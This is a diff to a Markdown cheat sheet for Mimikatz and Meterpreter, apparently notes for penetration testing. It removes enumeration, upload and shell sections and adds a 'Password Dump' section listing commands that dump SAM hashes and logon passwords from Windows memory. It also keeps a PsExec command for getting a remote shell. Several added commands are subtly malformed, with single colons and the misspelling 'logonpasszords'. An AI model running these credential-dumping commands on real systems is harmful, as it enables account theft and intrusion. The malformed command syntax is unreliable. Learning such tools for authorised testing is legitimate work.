@@ -6,52 +6,12 @@ description: "A tool to play with Windows security, written in C."
 
 **[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)**
 
-## Basis
-
-
- > 
- > **<font color=red>load kiwi</font>**</br>
- > Starts Mimikatz.
-
- > 
- > **<font color=red>help kiwi</font>**</br>
- > Show Mimikatz commands.
+## Check Admin Privileges
 
 
  > 
  > **<font color=red>privilege::debug</font>**</br>
  > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.
-
-## Enumeration
-
-
- > 
- > **<font color=red>systeminfo</font>**</br>
- > Display system infos.
- > 
- > **<font color=red>ipconfig</font>**</br>
- > Display infos about network interfaces.
-
- > 
- > **<font color=red>getuid</font>**</br>
- > User infos.
- > 
- > **<font color=red>getprivs</font>**</br>
- > Display current user privileges. 
-
-## File Upload
-
-
- > 
- > **<font color=red>upload</font> myFile**</br>
- > Transfer file to target.
-
-## Spawn Shell
-
-
- > 
- > **<font color=red>shell</font>**</br>
- > Open a shell.
 
 ## Initial Access
 
@@ -67,6 +27,21 @@ description: "A tool to play with Windows security, written in C."
  > 
  > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**</br>
  > Get a shell on the machine.
+
+## Password Dump
+
+
+ > 
+ > **<font color=red>creds_all</font>**</br>
+ > Dump passwords.
+
+ > 
+ > **<font color=red>lsadump:sam</font>**</br>
+ > Dump SAM base.
+
+ > 
+ > **<font color=red>sekurlsa:logonpasszords</font>**</br>
+ > Dump logon passwords.
 
 ## Pass the Ticket
 
